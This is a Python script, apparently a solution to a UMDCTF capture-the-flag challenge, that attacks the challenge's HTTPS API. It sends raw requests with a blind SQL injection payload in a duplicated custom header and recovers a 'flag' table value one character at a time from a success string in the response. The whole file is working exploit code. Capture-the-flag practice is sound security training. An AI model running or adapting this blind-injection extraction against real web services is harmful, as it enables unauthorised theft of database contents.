import socket
import ssl 
import string 

HOST = "steve-le-poisson-api.challs.umdctf.io"
PORT = 443
CHARS = string.ascii_letters + string.digits + "{}"
MAX_LEN = 50 
flag = ""

for i in range(1, MAX_LEN + 1):
    found = False
    for c in CHARS:
        payload = (
            "GET /deviner HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"X-Steve-Supposition: ' OR (SELECT substr(value,{i},1)='{c}' FROM flag)--\r\n"
            "X-Steve-Supposition: x\r\n"
            "User-Agent: test\r\n"
            "Connection: close\r\n"
            "\r\n"
        )

        context = ssl.create_default_context()
        with socket.create_connection((HOST, PORT)) as sock:
            with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                ssock.send(payload.encode())
                response = b""
                while True:
                    data = ssock.recv(4096)
                    if not data:
                        break
                    response += data

        if b"Tu as raison" in response:
            flag += c
            print(f"[+] Flag: {flag}")
            found = True
            break
    if not found:
        break